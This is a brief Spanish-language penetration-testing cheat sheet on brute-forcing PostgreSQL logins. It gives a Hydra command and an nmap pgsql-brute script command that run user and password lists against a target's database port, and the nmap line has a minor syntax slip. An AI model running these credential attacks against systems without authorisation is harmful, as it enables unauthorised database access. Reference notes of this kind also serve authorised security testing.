# PostgreSQL

### Ataque por fuerza bruta 
#### Hydra
```
hydra -L USERFILE  -P PASSFILE IP postgres
```
### Nmap Script
```
nmap -p 5432 --script pgsql-brute --script-argsuserdb=users.txt,passdb=pass.txt IP
```
